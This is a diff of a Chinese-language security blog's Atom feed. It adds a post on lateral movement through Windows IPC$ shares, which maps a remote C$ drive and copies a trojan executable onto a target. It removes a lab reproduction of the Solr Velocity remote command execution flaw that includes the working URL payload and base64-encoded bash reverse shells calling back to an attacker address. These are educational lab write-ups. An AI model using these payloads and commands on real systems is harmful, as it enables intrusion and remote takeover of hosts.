@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2020-01-31T15:57:26.800Z</updated>
+  <updated>2020-02-01T13:23:06.711Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>利用IPC进行横向渗透</title>
+    <link href="http://yoursite.com/2020/02/01/%E5%88%A9%E7%94%A8IPC%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/"/>
+    <id>http://yoursite.com/2020/02/01/利用IPC进行横向渗透/</id>
+    <published>2020-02-01T11:07:34.000Z</published>
+    <updated>2020-02-01T13:23:06.711Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="IPC利用条件"><a href="#IPC利用条件" class="headerlink" title="IPC利用条件"></a>IPC利用条件</h1><p>服务器开启了139或者445端口，可以利用IPC$连接，获取目标主机上的目录结构、用户信息等等。</p><h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>首先我们看当前IPC连接记录，这里的记录是空的，说明占时没有链接<br><img src="/2020/02/01/利用IPC进行横向渗透/1.png" alt></p><p>现在我们建立一个完整的连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\127.0.0.1\ipc$ &quot;password&quot; /user:&quot;username&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/2.png" alt><br>这个时候我们再net view，发现成功建立连接<br><img src="/2020/02/01/利用IPC进行横向渗透/3.png" alt></p><p>然后可以将目标机器的磁盘映射出来，这里我把目标机器的C盘映射到了本机的F盘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use F: \\127.0.0.1\c$ &quot;密码&quot; /user:&quot;用户名&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/4.png" alt><br><img src="/2020/02/01/利用IPC进行横向渗透/5.png" alt></p><p>查看下目标机器的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /s 192.168.43.100 /u username /p password</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/01/利用IPC进行横向渗透/6.png" alt></p><p>利用copy命令将我们构造好的木马程序复制到目标机器上面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy ccc.exe \\192.168.43.100\C$</span><br><span class="line"></span><br><span class="line">dir \\192.168.43.100\C&amp;</span><br></pre></td></tr></table></figure></p><p>然后怎么玩就看思路了</p><p>这个ipc的利用前提也是要有目标服务器的账号密码或者账号为空的情况下才能进去，有了账号密码可以直接3389了吧，哈哈哈</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;IPC利用条件&quot;&gt;&lt;a href=&quot;#IPC利用条件&quot; class=&quot;headerlink&quot; title=&quot;IPC利用条件&quot;&gt;&lt;/a&gt;IPC利用条件&lt;/h1&gt;&lt;p&gt;服务器开启了139或者445端口，可以利用IPC$连接，获取目标主机上的目录结构、用户信息等等。&lt;/
+      
+    
+    </summary>
+    
+    
+    
+      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
+    
+  </entry>
   
   <entry>
     <title>简单的域环境搭建</title>
@@ -437,28 +463,6 @@
     
     
       <category term="权限维持" scheme="http://yoursite.com/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Solr Velocity模板远程命令执行漏洞+反弹shell</title>
-    <link href="http://yoursite.com/2019/11/04/Solr-Velocity%E6%A8%A1%E6%9D%BF%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://yoursite.com/2019/11/04/Solr-Velocity模板远程命令执行漏洞/</id>
-    <published>2019-11-04T07:15:33.000Z</published>
-    <updated>2020-01-13T04:49:36.245Z</updated>
-    
-    <content type="html"><![CDATA[<p>这个漏洞出来好几天了一直没有时间进行复现</p><p>漏洞需要java的环境，这里我就直接在kali上进行搭建了<br><a id="more"></a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>首先下载源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.tgz</span><br></pre></td></tr></table></figure></p><p>解压之后进入bin目录下，运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr create_core -c alice -d ../example/example-DIH/solr/db -force</span><br></pre></td></tr></table></figure></p><p>这里是新建了一个alice的core，然后启用环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./solr start -force</span><br></pre></td></tr></table></figure></p><p>默认端口是8983，我们访问这个地址，然后在core admin中找到了alice<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/alice.png" alt></p><p>每一个我们新建的core都有配置信息<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/config.png" alt></p><p>这里我们要修改一下配置，我们要将params.resource.loader.enabled这个参数设置为true，默认为false，才能触发漏洞，post提交下面的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"> &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">   &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">   &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">   &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;:&quot;&quot;,</span><br><span class="line">   &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">   &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/post.png" alt><br>返回200，说明修改成功</p><p>漏洞环境就搭建到这里啦</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.128:8983/solr/alice/select?q=1&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/id.png" alt></p><p>这样就可以执行命令了，github上也有很多利用的脚本</p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>这里好像和之前泛微oa的命令执行是一样的，利用了getRuntime().exec()这个函数来执行命令，但是这个函数有一些特性，可以看下面的文章和内容<br><a href="https://mp.weixin.qq.com/s/ZS-hA03ykKleDjgN8oWZDw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZS-hA03ykKleDjgN8oWZDw</a><br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/runtime.png" alt></p><p>所以我们直接执行命令的时候不能使用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure></p><p>而是要利用base64编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYxIA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure></p><p>这里我们来实验一下：<br>目标机器:192.168.43.128<br>攻击机器:192.168.43.1</p><p>首先在攻击机器上设置nc监听端口<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/nc.png" alt></p><p>然后将我们反弹shell的bash命令进行base64编码：<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/base64.png" alt></p><p>然后进行一次url编码<br><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/url.png" alt></p><p>构造后的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%27bash+-c+%7becho%2cYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQzLjEvMTEyMzMgMD4mMQ%3d%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%27</span><br></pre></td></tr></table></figure></p><p><img src="/2019/11/04/Solr-Velocity模板远程命令执行漏洞/success.png" alt><br>这样我们就能反弹shell了<br>脚本就不写咯<br>:)</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;这个漏洞出来好几天了一直没有时间进行复现&lt;/p&gt;
-&lt;p&gt;漏洞需要java的环境，这里我就直接在kali上进行搭建了&lt;br&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
   </entry>
   
